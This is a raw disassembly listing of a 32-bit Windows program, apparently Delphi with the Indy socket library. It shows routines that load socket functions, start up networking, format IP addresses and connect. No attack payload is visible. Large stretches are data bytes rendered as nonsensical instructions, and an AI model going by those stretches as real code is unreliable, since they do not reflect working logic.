cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + edi * 8 - 0x599c0000 ] dh
inc edi
add [ ebp + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + edi * 8 - 0x599c0000 ] bh
inc edi
add [ ebp + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + edi * 8 - 0x599c0000 ] ah
inc edi
add [ ebp + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000fe ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + edi * 8 - 0x599c0000 ] ch
inc edi
add [ ebp + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000fe ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + edi * 8 - 0x599c0000 ] dl
inc edi
add [ ebp + 0x640000fe ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x550000fe ] dl
mov ebp esp
xor eax eax
push ebp
push sub_45a259
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a260
retn
sub_45a2e4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45a384
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_4040a4
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_4035a0
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40ad88
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_4040a4
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4043d0
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40b590
mov ecx edi
xor edx edx
mov eax ebx
call sub_40b590
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a38b
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404074
retn
sub_45a38b
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45b168
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45b20b
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b212
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408d10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a2e4
call sub_403a08
sub_45b21c
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_45b240
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45b30d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_408d10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a2e4
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b314
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
sub_45b34b
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45b378
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b37f
retn
call sub_45a3bc
sub_45b394
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b3b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b3c0
retn
sub_45b3cc
sbb [ ebp + eax * 2 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
mov ah 0x45
add [ eax + eax ] al
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x2a900040 ] al
inc eax
add [ eax - 0x6fffbfd6 ] dl
sub al [ eax ]
nop
sub al [ eax ]
or eax 0x53644954
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ edi * 4 + 0x2a900045 ] ah
inc eax
add [ eax - 0x6fffbfd6 ] dl
sub al [ eax ]
jo r-xdata
imul esi [ ebx + 0x74 ] 0xb484c08b
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
mov ch 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
mov ch 0x45
add [ eax ] dl
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
inc ebp
add [ eax - 0x6fffbfd6 ] dl
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
mov ch 0x45
add [ eax + eax ] cl
add [ eax ] al
and al 0xb5
inc ebp
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451c0040 ] al
dec ecx
push ebx
je r-xdata
arpl [ ebx - 0x70 ] bp
jo r-xdata
test [ edx ] dh
inc eax
add [ edi ] dl
inc ebp
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
adc al 0xb8
inc ebp
add [ eax - 0x6fffbfd6 ] dl
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
nop
sub al [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] ch
add [ eax - 0x6fffbfd6 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4b ] dh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x450d0040 ] al
dec ecx
push ebx
je r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
dec ecx
push ebx
je r-xdata
outsd
outsb
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_45b65c
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x3800408d
mov dh 0x45
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov dh 0x45
add [ eax + eax ] cl
add [ eax ] al
and al 0xb5
inc ebp
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45170040 ] al
inc ebp
outsd
jb r-xdata
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ eax ] al
ror ah 0xb5
sub_45b65c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_45b710
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_45b6a4
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_45b703
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b70a
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_45b710
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45b762
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_459e8c
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b769
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_45b79c
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx r-xdata
mov eax ebx
call sub_407ddc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_45bc48
test al al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4040a4
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax edi
mov edx ebx
call sub_4040a4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45b814
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_45bc0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404050
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408d10
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4040a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bc15
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
jmp [ eax * 4 + jump_table_45b854 ]
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405b50
sub_45bc1c
push ebx
mov ebx eax
or edx 0xffffffff
mov eax ebx
call sub_4080c0
inc eax
jle r-xdata
xor eax eax
pop ebx
retn
mov edx 0x100
mov eax ebx
call sub_4080c0
cmp eax 0x100
jl r-xdata
mov al 0x1
pop ebx
retn
sub_45bc48
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_45bd07
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4040e8
mov eax [ ebp - 0x8 ]
call sub_45bc1c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45bc1c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bd0e
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404074
retn
mov eax [ ebp - 0x10 ]
call sub_45bc1c
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_45bc1c
test al al
jne r-xdata
mov bl 0x1
sub_45bd24
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_45bd54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_45bd9c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bda3
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_45bdac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45bdd1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bdd8
retn
sub_45bde4
xor [ esi + 0x45 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
mov esi 0x1080045
add [ eax ] al
int3
sub_45be5c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edi + 0x100045 ] bh
add [ eax ] al
cmp [ ebp + eax * 2 + 0x4034c400 ] dh
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah bh
mov edi 0xc9000045
inc ebp
add [ eax + 0x780045c9 ] ch
mov [ ebp ] 0x38
mov edi 0xc0d40045
inc ebp
add [ ecx + eax * 8 + 0x45 ] ah
add al dl
rol [ ebp ] 0xdc
rol [ ebp ] 0x2c
retn 0x45
sub_45bf0a
inc ebp
add al bl
int 0x45
add [ esi + eax * 8 - 0x348bffbb ] bl
inc ebp
add [ esp + ecx * 8 ] dl
inc ebp
add [ esp + ecx * 8 - 0x3fdbffbb ] dh
inc ebp
add [ edx + ecx * 8 + 0x540f0045 ] cl
dec ecx
push ebx
je r-xdata
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45bfd6
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_45b770
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bfdd
lea eax [ ebp - 0x194 ]
call sub_404050
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_45b240
inc eax
jne r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_45bffc
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45bd24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_45c024
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_45c0b8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_407f48
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_407f48
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_407f48
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_407f48
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_4043d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c0bf
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404074
retn
sub_45c164
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_404310
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_45bd54
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45c1dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45bd54
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45c22c
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_404510
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_45b650
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_45c288
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_404510
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_404248
or edx 0xffffffff
mov eax esi
call sub_45b650
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_45c2d8
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_40469c
mov eax [ ebx ]
call sub_404310
push eax
mov eax [ ebx ]
call sub_404510
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_404510
mov edx eax
mov eax ebx
call sub_404248
pop ebx
retn
sub_45c320
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_45c33c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_45c3c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
